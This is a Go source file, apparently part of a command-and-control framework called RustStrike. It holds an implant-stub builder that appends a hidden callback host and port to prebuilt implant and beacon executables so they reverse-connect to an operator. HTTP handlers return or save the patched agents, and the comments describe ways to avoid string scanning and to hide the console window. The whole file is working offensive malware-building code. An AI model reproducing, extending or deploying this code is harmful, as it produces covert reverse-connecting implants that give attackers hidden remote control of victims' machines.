package main

// Implant stub patcher: appends a config trailer to a prebuilt implant exe so
// it reverse-connects to a given host:port WITHOUT CLI args. The implant reads
// this trailer at startup (see crates/implant/src/main.rs::read_trailer_config);
// if absent it falls back to args[1]/args[2].
//
// Trailer layout (appended to the exe bytes):
//   <exe bytes>... <padding to align> <TrailerMagic> <host> "\x00" <port> "\x00"
//
// The magic + NUL-delimited fields are binary-safe. The implant reads only the
// last ~256 bytes to find it, so keep the trailer short.

import (
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"strings"
)

// TrailerMagic is the marker the implant searches for near the end of its exe.
// Opaque byte sequence (not a readable word) so it isn't a string-scan
// telltale; must match crates/implant/src/main.rs::TRAILER_MAGIC.
var TrailerMagic = []byte{0x7C, 0x53, 0x9A, 0x2E, 0xD1, 0x04, 0xB8, 0x6F, 0x11, 0xA3}

// PatchImplant returns the base implant/beacon/beacon-cycle exe bytes with a
// host:port (and optional interval / dwell) trailer appended. baseExe is the
// path to a prebuilt ruststrike-implant.exe, ruststrike-beacon.exe, or
// ruststrike-beacon-cycle.exe.
//
// Trailer layout (appended to the exe bytes):
//
//	<exe bytes>... <TrailerMagic> <host> "\x00" <port> "\x00"
//	            [<interval> "\x00" [<dwell> "\x00"]]
//
// The optional `interval` (decimal seconds, non-empty) is the beacon callback
// cadence — only beacons read it; the stock implant stops after port and
// ignores trailing bytes, so appending it is backwards compatible. The
// optional `dwell` (decimal seconds, non-empty) is the beacon-cycle
// connection-hold window — it sits after `interval` and is read only by the
// cycle crate. Pass "" to omit either field (implant trailer, or a beacon that
// should fall back to its default interval, or a cycle trailer without a baked
// dwell).
//
// The magic + NUL-delimited fields are binary-safe. The implant/beacon/cycle
// reads only the last ~512 bytes to find it, so keep the trailer short.
func PatchImplant(baseExe, host, port, interval, dwell string) ([]byte, error) {
	if host == "" || port == "" {
		return nil, errors.New("host and port required")
	}
	raw, err := os.ReadFile(baseExe)
	if err != nil {
		return nil, fmt.Errorf("read base exe %s: %w", baseExe, err)
	}
	// If the base already has a trailer (e.g. re-patching), strip it first so we
	// don't accumulate trailers.
	raw = stripTrailer(raw)
	out := make([]byte, 0, len(raw)+len(TrailerMagic)+len(host)+len(port)+len(interval)+len(dwell)+8)
	out = append(out, raw...)
	out = append(out, TrailerMagic...)
	out = append(out, []byte(host)...)
	out = append(out, 0)
	out = append(out, []byte(port)...)
	out = append(out, 0)
	if interval != "" {
		out = append(out, []byte(interval)...)
		out = append(out, 0)
	}
	if dwell != "" {
		out = append(out, []byte(dwell)...)
		out = append(out, 0)
	}
	return out, nil
}

// stripTrailer removes a trailing trailer (if present) so an exe can be
// re-patched cleanly. Searches the last 512 bytes for the magic.
func stripTrailer(raw []byte) []byte {
	window := 512
	if len(raw) < window {
		window = len(raw)
	}
	tail := raw[len(raw)-window:]
	idx := lastIndex(tail, TrailerMagic)
	if idx < 0 {
		return raw
	}
	// truncate from the magic onward (in the full slice)
	cutAt := len(raw) - window + idx
	return raw[:cutAt]
}

// lastIndex returns the index of the first byte of needle in haystack, or -1.
func lastIndex(haystack, needle []byte) int {
	if len(needle) == 0 || len(needle) > len(haystack) {
		return -1
	}
	for i := 0; i <= len(haystack)-len(needle); i++ {
		match := true
		for j := 0; j < len(needle); j++ {
			if haystack[i+j] != needle[j] {
				match = false
				break
			}
		}
		if match {
			return i
		}
	}
	return -1
}

// Stub variant selects which base agent exe to patch.
const (
	variantImplant = "implant"       // stock implant: persistent channel, relay/pivot
	variantBeacon  = "beacon"        // beacon: auto-reconnect, persistent channel while online
	variantCycle   = "beacon-cycle"  // short-cycle beacon: short pulses, sleeps between check-ins
)

// variantNames returns the (preferred, silentSibling) candidate exe filenames
// for a stub variant.
func variantNames(variant string) (preferred, silentName string) {
	switch variant {
	case variantBeacon:
		return "ruststrike-beacon.exe", "ruststrike-beacon-silent.exe"
	case variantCycle:
		return "ruststrike-beacon-cycle.exe", "ruststrike-beacon-cycle-silent.exe"
	default:
		return "ruststrike-implant.exe", "ruststrike-implant-silent.exe"
	}
}

// variantEnvVar returns the env var name that overrides the base exe for a
// variant (RUSTSTRIKE_IMPLANT_EXE / RUSTSTRIKE_BEACON_EXE /
// RUSTSTRIKE_BEACON_CYCLE_EXE), plus the short label used in error messages.
func variantEnvVar(variant string) (envName, label string) {
	switch variant {
	case variantBeacon:
		return "RUSTSTRIKE_BEACON_EXE", "beacon"
	case variantCycle:
		return "RUSTSTRIKE_BEACON_CYCLE_EXE", "beacon-cycle"
	default:
		return "RUSTSTRIKE_IMPLANT_EXE", "implant"
	}
}

// resolveBaseImplantExe finds the prebuilt base exe: an explicit override env
// var for the variant (plus config Paths.ImplantExe for the stock implant),
// else <exe-dir>/<variant>.exe, else a repo-relative path. When `silent` is
// true it prefers the GUI-subsystem silent variant (no console window on
// launch); if that's missing it falls back to the console exe so a build
// without the silent bin still works.
//
// `silent` is applied as a sibling-swap on whatever base was resolved: if the
// resolved base is the console build (ruststrike-implant.exe / -beacon.exe /
// -beacon-cycle.exe) and a -silent sibling sits next to it, the silent sibling
// wins. An explicit override that already points at the silent exe (or a
// custom name) is left untouched.
func resolveBaseImplantExe(silent bool, variant string) (string, error) {
	preferred, silentName := variantNames(variant)
	// Candidate names in preference order: silent first when requested.
	names := []string{preferred}
	if silent {
		names = []string{silentName, preferred}
	}
	envName, label := variantEnvVar(variant)
	// Explicit override — but honor `silent` by swapping to the silent sibling
	// if the override points at the console exe. The stock implant honors the
	// config Paths.ImplantExe (`baseImplantExe`) as well as its env var; the
	// beacon / cycle have no config field, so they use their env var only.
	if variant == variantImplant && baseImplantExe != "" {
		if _, err := os.Stat(baseImplantExe); err == nil {
			return silentSibling(baseImplantExe, silent, variant), nil
		}
	}
	override := os.Getenv(envName)
	if override != "" {
		if _, err := os.Stat(override); err == nil {
			return silentSibling(override, silent, variant), nil
		}
	}
	if exe, err := os.Executable(); err == nil {
		for _, n := range names {
			cand := filepath.Join(filepath.Dir(exe), n)
			if _, err := os.Stat(cand); err == nil {
				return cand, nil
			}
		}
	}
	// repo-relative fallback (core runs from clients/server)
	for _, n := range names {
		cand := filepath.Join("..", "..", "target", "release", n)
		if _, err := os.Stat(cand); err == nil {
			abs, _ := filepath.Abs(cand)
			return abs, nil
		}
	}
	return "", fmt.Errorf("base %s exe not found (set %s)", label, envName)
}

// silentSibling returns the path to use for the base exe given a `silent`
// request. If silent is true and `base` is the console exe of the variant
// (ruststrike-implant.exe / -beacon.exe / -beacon-cycle.exe) with a -silent
// sibling, it returns the sibling; otherwise `base` unchanged.
func silentSibling(base string, silent bool, variant string) string {
	if !silent {
		return base
	}
	dir := filepath.Dir(base)
	name := filepath.Base(base)
	preferred, silentName := variantNames(variant)
	if name != preferred {
		return base // custom name or already the silent exe — leave as-is
	}
	sib := filepath.Join(dir, silentName)
	if _, err := os.Stat(sib); err == nil {
		return sib
	}
	return base
}

// stubBuildHandler — POST /api/stub/build body {host, port, silent?, beacon?, interval?} -> {exe_b64}.
//
// `silent` (default false) selects the GUI-subsystem base exe so the deployed
// agent runs with no console window. When true and the silent exe is present,
// the patched stub is windowless; if the silent exe is missing it falls back
// to the console exe (still functional, just not hidden).
//
// `beacon` (default false) selects the beacon base exe (ruststrike-beacon.exe)
// instead of the stock implant — a beacon reconnects forever on a callback
// cadence rather than holding a single persistent channel.
//
// `cycle` (default false) selects the short-cycle beacon base exe
// (ruststrike-beacon-cycle.exe) — short-lived connections on a cadence rather
// than a persistent channel. `cycle` wins over `beacon` when both are set.
//
// `template` (optional) is an agent-template id (see agent_templates.go). When
// set it overrides the variant + interval/dwell derivation: the template's
// `variant` decides the base exe, and the handler still honors the request's
// `interval`/`dwell` for the cadence values.
//
// `interval` (decimal seconds, optional) is appended to the trailer so a
// generated beacon/cycle checks in at the operator-chosen cadence with no
// args/env. For a beacon it's the reconnection cadence; for a cycle it's the
// sleep between check-ins. The stock implant ignores trailing trailer bytes.
// Pass "" to omit.
//
// `dwell` (decimal seconds, optional) is appended to the trailer as a fourth
// field — the cycle's connection-hold window. Only the cycle crate reads it.
// Pass "" to omit (or for a beacon/implant, which ignore it).
func stubBuildHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "POST only", http.StatusMethodNotAllowed)
		return
	}
	var body struct {
		Host     string `json:"host"`
		Port     string `json:"port"`
		Silent   bool   `json:"silent"`
		Beacon   bool   `json:"beacon"`
		Cycle    bool   `json:"cycle"`
		Interval string `json:"interval"`
		Dwell    string `json:"dwell"`
		Template string `json:"template"`
	}
	if err := decodeJSONBody(r, &body); err != nil {
		http.Error(w, "bad json: "+err.Error(), http.StatusBadRequest)
		return
	}
	variant := resolveVariant(body.Cycle, body.Beacon, body.Template)
	base, err := resolveBaseImplantExe(body.Silent, variant)
	if err != nil {
		http.Error(w, err.Error(), http.StatusServiceUnavailable)
		return
	}
	interval, dwell := trailerCadence(variant, body.Interval, body.Dwell)
	patched, err := PatchImplant(base, body.Host, body.Port, interval, dwell)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	writeJSON(w, http.StatusOK, map[string]string{
		"exe_b64": base64.StdEncoding.EncodeToString(patched),
		"host":    body.Host,
		"port":    body.Port,
		"size":    fmt.Sprintf("%d", len(patched)),
	})
}

// resolveVariant picks the stub variant from the request booleans, honoring an
// optional template id (which carries its own variant). The template is
// authoritative when it names a non-implant variant (beacon / beacon-cycle) —
// those templates inherently imply their variant. When the template is the
// stock implant (variant "implant") the beacon/cycle booleans still win, so
// "implant template + beacon=true" builds a beacon (preserving the pre-template
// behavior where the beacon checkbox selected the beacon exe). `cycle` wins
// over `beacon` when both are set.
func resolveVariant(cycle, beacon bool, templateID string) string {
	if cycle {
		return variantCycle
	}
	if beacon {
		return variantBeacon
	}
	if t := lookupTemplateVariant(templateID); t != "" {
		return t
	}
	return variantImplant
}

// trailerCadence returns the (interval, dwell) trailer fields to append for a
// variant. The stock implant gets no cadence fields. A beacon gets only the
// interval. A cycle gets both interval (sleep) and dwell — dwell falls back to
// a default when empty.
func trailerCadence(variant, interval, dwell string) (string, string) {
	switch variant {
	case variantCycle:
		d := strings.TrimSpace(dwell)
		if d == "" {
			d = "2"
		}
		return interval, d
	case variantBeacon:
		return interval, ""
	default:
		return "", ""
	}
}

// decodeJSONBody is a small helper shared by handlers.
func decodeJSONBody(r *http.Request, v any) error {
	return json.NewDecoder(r.Body).Decode(v)
}

// repoRootFromBaseExe derives the RustStrike repo root from the base implant
// exe path (<repo>/target/release/ruststrike-implant.exe). It walks up from
// the exe's dir looking for a `Cargo.toml` marker (robust to the exe living
// elsewhere via RUSTSTRIKE_IMPLANT_EXE), falling back to three dirs up.
func repoRootFromBaseExe(baseExe string) string {
	dir := filepath.Dir(baseExe)
	for d := dir; d != "" && d != "." && d != filepath.Dir(d); d = filepath.Dir(d) {
		if _, err := os.Stat(filepath.Join(d, "Cargo.toml")); err == nil {
			return d
		}
	}
	// fallback: <repo>/target/release/<exe> -> three dirs up
	return filepath.Dir(filepath.Dir(filepath.Dir(baseExe)))
}

// safeFileName turns an operator-supplied name into something safe for a
// Windows filename (no path separators, no trailing dots/spaces).
func safeFileName(name string) string {
	if name == "" {
		name = "ruststrike-implant"
	}
	name = strings.Map(func(r rune) rune {
		if r < 32 || strings.ContainsRune(`<>:"/\|?*`, r) {
			return '_'
		}
		return r
	}, name)
	name = strings.TrimRight(name, ". ")
	return name
}

// stubSaveHandler — POST /api/stub/save body {host, port, name, silent?, beacon?, cycle?, interval?, dwell?, template?} -> {path, exe_b64}.
//
// Writes the patched exe to <repo>/agents/<name>.exe (so a copy lives under
// the project — gitignored via *.exe) AND returns it base64 so the operator
// GUI can trigger a browser download too. The agents/ dir is created on first
// use. `silent` selects the GUI-subsystem base exe (no console window).
// `beacon`/`cycle` select the beacon / short-cycle base exe; `interval`
// (decimal seconds, beacon/cycle) is baked into the trailer as the callback
// cadence; `dwell` (decimal seconds, cycle) is the connection-hold window.
// `template` overrides the variant (see stubBuildHandler).
func stubSaveHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "POST only", http.StatusMethodNotAllowed)
		return
	}
	var body struct {
		Host     string `json:"host"`
		Port     string `json:"port"`
		Name     string `json:"name"`
		Silent   bool   `json:"silent"`
		Beacon   bool   `json:"beacon"`
		Cycle    bool   `json:"cycle"`
		Interval string `json:"interval"`
		Dwell    string `json:"dwell"`
		Template string `json:"template"`
	}
	if err := decodeJSONBody(r, &body); err != nil {
		http.Error(w, "bad json: "+err.Error(), http.StatusBadRequest)
		return
	}
	variant := resolveVariant(body.Cycle, body.Beacon, body.Template)
	base, err := resolveBaseImplantExe(body.Silent, variant)
	if err != nil {
		http.Error(w, err.Error(), http.StatusServiceUnavailable)
		return
	}
	interval, dwell := trailerCadence(variant, body.Interval, body.Dwell)
	patched, err := PatchImplant(base, body.Host, body.Port, interval, dwell)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	agentsDir := filepath.Join(repoRootFromBaseExe(base), "agents")
	if err := os.MkdirAll(agentsDir, 0o755); err != nil {
		http.Error(w, "create agents dir: "+err.Error(), http.StatusInternalServerError)
		return
	}
	fname := safeFileName(body.Name)
	if !strings.HasSuffix(strings.ToLower(fname), ".exe") {
		fname += ".exe"
	}
	outPath := filepath.Join(agentsDir, fname)
	if err := os.WriteFile(outPath, patched, 0o644); err != nil {
		http.Error(w, "write stub: "+err.Error(), http.StatusInternalServerError)
		return
	}
	writeJSON(w, http.StatusOK, map[string]string{
		"path":    outPath,
		"exe_b64": base64.StdEncoding.EncodeToString(patched),
		"host":    body.Host,
		"port":    body.Port,
		"size":    fmt.Sprintf("%d", len(patched)),
	})
}
